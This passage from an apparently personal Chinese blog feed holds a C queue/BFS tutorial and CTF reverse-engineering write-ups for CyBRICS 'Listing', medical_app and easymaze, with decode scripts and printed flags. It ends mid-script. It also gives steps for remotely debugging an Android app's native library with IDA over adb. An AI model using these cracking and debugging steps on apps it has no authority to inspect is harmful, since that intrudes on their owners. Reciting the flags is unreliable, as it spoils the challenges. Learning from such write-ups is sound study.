<span class="title">initQueue</span><span class="params">(Queue* Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//当head==last就代表队列空</span></span><br><span class="line">Q-&gt;head = <span class="number">0</span>;</span><br><span class="line">Q-&gt;last = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(Queue* Q, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;last + <span class="number">1</span>) % max == Q-&gt;head)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对列满了\n&quot;</span>);<span class="comment">//实际上为了让对列满和对列空的条件不一样，让对列实际上还空了一个。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;data[Q-&gt;last] = num;</span><br><span class="line">Q-&gt;last = (Q-&gt;last + <span class="number">1</span>) % max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(Queue* Q, <span class="keyword">int</span>* num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;head == Q-&gt;last)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对列空\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">*num = Q-&gt;data[Q-&gt;head];</span><br><span class="line">Q-&gt;head = (Q-&gt;head + <span class="number">1</span>) % max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(Queue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q.head == Q.last)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(Queue* Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;last - Q-&gt;head + max) % max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* --------------------------------------------------------------- */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateMGraph</span><span class="params">(MGraph* G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">G-&gt;numEdges = <span class="number">15</span>;</span><br><span class="line">G-&gt;numVertexes = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读入顶点信息，建立顶点表 */</span></span><br><span class="line">G-&gt;vexs[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">1</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">3</span>] = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">4</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">5</span>] = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">6</span>] = <span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">7</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">8</span>] = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numVertexes; i++)<span class="comment">/* 初始化图 */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G-&gt;numVertexes; j++)</span><br><span class="line">&#123;</span><br><span class="line">G-&gt;arc[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">0</span>][<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">2</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">4</span>][<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">4</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">5</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">6</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numVertexes; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &lt; G-&gt;numVertexes; j++)</span><br><span class="line">&#123;</span><br><span class="line">G-&gt;arc[j][i] = G-&gt;arc[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(MGraph G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line">Queue Q;</span><br><span class="line">initQueue(&amp;Q);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.numVertexes; i++)<span class="comment">//这个循环是为了保证所有点，可能某些点是单独的，没有任何边。</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (mark[i] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">mark[i] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, G.vexs[i]);</span><br><span class="line">push(&amp;Q, i);</span><br><span class="line"><span class="keyword">while</span> (!QueueEmpty(Q))</span><br><span class="line">&#123;</span><br><span class="line">pop(&amp;Q, &amp;i);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.numVertexes; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (G.arc[i][j] == <span class="number">1</span> &amp;&amp; mark[j] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">mark[j] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, G.vexs[j]);</span><br><span class="line">push(&amp;Q, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MGraph G;</span><br><span class="line">CreateMGraph(&amp;G);</span><br><span class="line">bfs(G);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D0g3比赛平台 re wp</title>
      <link href="2021/08/02/D0g3%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%20re%20wp/"/>
      <url>2021/08/02/D0g3%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="D0g3比赛平台-re-wp"><a href="#D0g3比赛平台-re-wp" class="headerlink" title="D0g3比赛平台 re wp"></a>D0g3比赛平台 re wp</h1><p>最近几天都在看题吧，xctf和极客巅峰都看了看，xctf做了一道re签到题，学了点x64汇编，后面的两道题大概尽量分析了下，对win32窗口和动调更熟悉了。极客巅峰的话做了一道re签到题，rc4+xxtea的apk，给了x86的so文件就是香。maze逻辑倒是不难，就是不会写脚本，用pexpect模块写交互或者用pwn交互，准备后面注重写代码能力，学习数据结构。</p><h2 id="XCTF-CyBRICS-2021-Listing"><a href="#XCTF-CyBRICS-2021-Listing" class="headerlink" title="XCTF-CyBRICS 2021 Listing"></a>XCTF-CyBRICS 2021 Listing</h2><p>asm，64位汇编，AVX2指令，直接看是可以看懂逻辑的，但是由于对64位汇编了解太少，不知道具体过程(什么顺序放入的256bit寄存器)，后来一想，可以直接放到x64dbg里面调呀，直接就把指令随便弄到一个exe里面了(64位内敛汇编还不知道怎么弄)。</p><p>直接上图<br><img src="https://i.loli.net/2021/07/29/9dvUaoHPzNJsuIT.png"><br>有个指令需要说一下，vpshufb，相当于就是换位置，类似下面的过程，只不过是256bit。<br><img src="https://i.loli.net/2021/07/29/2yRHIxetlGnivXT.jpg"></p><p>写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># &#x27;D1 D3 76 23 35 61 9A AB D5 D5 23 27 35 65 83 F8      C9 D3 61 27 33 6C 85 B9 D5 D6 22 71 31 61 CB F8&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;83f865352327d5d59aab35617623d1d3 cbf861312271d5d685b9336c6127c9d3&#x27;</span></span><br><span class="line"><span class="comment"># str = &quot;010003020504070609080B0A0C0D0F0E 111013121514171619181B1A1C1D1F1E&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str1</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = binascii.unhexlify(s)</span><br><span class="line">    <span class="keyword">return</span> s.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = (<span class="number">0x83f865352327d5d59aab35617623d1d3cbf861312271d5d685b9336c6127c9d3</span> ^ <span class="number">0xFECA50051345B0B0FECA50051345B0B0FECA50051345B0B0FECA50051345B0B0</span>)</span><br><span class="line"><span class="comment"># 7d32353030626565646165646566616335323134313465667b73636972627963</span></span><br><span class="line">s = hex_to_str1(<span class="string">&#x27;7d32353030626565646165646566616335323134313465667b73636972627963&#x27;</span>)</span><br><span class="line">s = s[::-<span class="number">1</span>]</span><br><span class="line">print(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment">#cybrics&#123;fe414125cafedeadeeb0052&#125;</span></span><br></pre></td></tr></table></figure><h2 id="极客巅峰-medical-app"><a href="#极客巅峰-medical-app" class="headerlink" title="极客巅峰 medical_app"></a>极客巅峰 medical_app</h2><p>3血，apk，so层的chr是检测函数，rc4+改dealt的xxtea，题很简单主要是说说怎么调so文件，由于设备有限，只能用模拟器调调x86的so文件。参考文章<a href="https://www.cnblogs.com/ddms/p/8820044.html">https://www.cnblogs.com/ddms/p/8820044.html</a>，<a href="https://blog.csdn.net/freeking101/article/details/106701908">https://blog.csdn.net/freeking101/article/details/106701908</a></p><p>1.打开雷电模拟器，这道题比较特别，屏幕大小设置成1600*900才打得开这个apk。</p><p>2.用<a href="https://www.cnblogs.com/ddms/p/8820044.html">https://www.cnblogs.com/ddms/p/8820044.html</a>文章中的方法，向模拟器中传入android_x86_server。</p><p>android_server，和android_server64是真机用的，android_x86_server，和android_x64_server是模拟器用的。</p><p>3.用adb链接模拟器。</p><pre><code>adb kill-server 这句的意思是终止adb服务adb devices 意思是查看现在所连接的设备 如果adb服务没开会帮你打开adb shell 就是拿到设备的shell了adb forward tcp:23946 tcp:23946 端口转发</code></pre><p>4.打开ida，Debugger-&gt;Attach-&gt;Remote Linux debugger，写本地ip，127.0.0.1，然后ok。选择好要链接的名称，找到so文件名称，找到函数，打断点，f9，然后在模拟器中输入字符串，就发现断了下来。</p><p>之前失败的原因是设备对应不上或者是debugger选择错了，真机和模拟器是有区别的，题可能会给4个so文件，就是对应了不同的架构，但是一般都只给一个arm64-v8a，要用root真机。。。。</p><pre><code>x86  32位 android_x86_server   Remote Linux debugger 32位模拟器x86_64 64位 android_x32_server Remote Linux debugger 64位模拟器armeabi-v7a 32位 android_server  Remote ARM Linux/Android debuggber 32位真机arm64-v8a 64位 android_server64 Remote ARM Linux/Android debuggber 64位真机</code></pre><p>直接上解题脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//xxtea</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key ,<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> next,end,sum;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rounds,e,delta=<span class="number">0x9F5776B6</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    rounds=<span class="number">6</span>+<span class="number">52</span>/n;</span><br><span class="line">    sum=delta*rounds;    </span><br><span class="line">    next=code[<span class="number">0</span>];<span class="comment">//设置next为code的第一个 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e=(sum&gt;&gt;<span class="number">2</span>)&amp;<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)<span class="comment">//解密最后一个到第二个</span></span><br><span class="line">        &#123;</span><br><span class="line">            end=code[i<span class="number">-1</span>];</span><br><span class="line">            code[i]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>)  + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) + (key[(i&amp;<span class="number">3</span>)^e]^end) ))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">            next=code[i];</span><br><span class="line">        &#125;</span><br><span class="line">        end=code[n<span class="number">-1</span>];</span><br><span class="line">        code[<span class="number">0</span>]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>) + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) +(key[i&amp;<span class="number">3</span>^e]^end) ))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">        next=code[<span class="number">0</span>];</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0x00000001</span>,<span class="number">0x00000010</span>,<span class="number">0x00000100</span>,<span class="number">0x00001000</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n=<span class="number">9</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">9</span>]=&#123;<span class="number">0x68e5973e</span>,<span class="number">0xc20c7367</span>,<span class="number">0x98afd41b</span>,<span class="number">0xfe4b9de2</span>,<span class="number">0x01a5b60b</span>,<span class="number">0x3d36d646</span>,<span class="number">0xdbcc7baf</span>,<span class="number">0xa0414f00</span>,<span class="number">0x762ce71a</span>&#125;;</span><br><span class="line">    decrypt(code,key,n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;0x%x,&quot;,code[i]);</span></span><br><span class="line">        <span class="comment">//printf(&quot;0x%x,0x%x,0x%x,0x%x,&quot;,*((char*)&amp;code[i]+3)&amp;0xff,*((char*)&amp;code[i]+2)&amp;0xff,*((char*)&amp;code[i]+1)&amp;0xff,*((char*)&amp;code[i]+0)&amp;0xff);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,0x%x,0x%x,0x%x,&quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>)&amp;<span class="number">0xff</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>)&amp;<span class="number">0xff</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>)&amp;<span class="number">0xff</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>)&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//rc4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;<span class="comment">//做一道re的题时这里就改为了，s[i]=256-i</span></span><br><span class="line">        k[i] = key[i&amp; <span class="number">0xF</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;<span class="number">36</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,s[t]);</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123;  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = &#123;<span class="number">0x56</span>,<span class="number">0x4</span>,<span class="number">0xb0</span>,<span class="number">0xd4</span>,<span class="number">0x9c</span>,<span class="number">0x63</span>,<span class="number">0x4d</span>,<span class="number">0x30</span>,<span class="number">0x96</span>,<span class="number">0xce</span>,<span class="number">0xc0</span>,<span class="number">0x5</span>,<span class="number">0x93</span>,<span class="number">0xbe</span>,<span class="number">0x3b</span>,<span class="number">0x82</span>,<span class="number">0x52</span>,<span class="number">0x4b</span>,<span class="number">0x16</span>,<span class="number">0xb2</span>,<span class="number">0x8a</span>,<span class="number">0x33</span>,<span class="number">0xb7</span>,<span class="number">0x4d</span>,<span class="number">0x6d</span>,<span class="number">0x7b</span>,<span class="number">0x99</span>,<span class="number">0x50</span>,<span class="number">0xc2</span>,<span class="number">0xb1</span>,<span class="number">0xc</span>,<span class="number">0x12</span>,<span class="number">0xe1</span>,<span class="number">0x84</span>,<span class="number">0xa</span>,<span class="number">0x93</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;194836950ae9df840e8a94348b901a&#125;</span></span><br></pre></td></tr></table></figure><h2 id="极客巅峰-easymaze"><a href="#极客巅峰-easymaze" class="headerlink" title="极客巅峰 easymaze"></a>极客巅峰 easymaze</h2><p>学了数据结构dfs，现在照着学长的思路回来做做，我用的是pwn库交互，学长用的pexpect</p><p>将成功判断都改为”1”</p><p>exp，python的二维数组真的坑，看了几个小时，发现是二维数组定义错了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./maze1&#x27;</span>)</span><br><span class="line"><span class="built_in">next</span> = [[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>],[<span 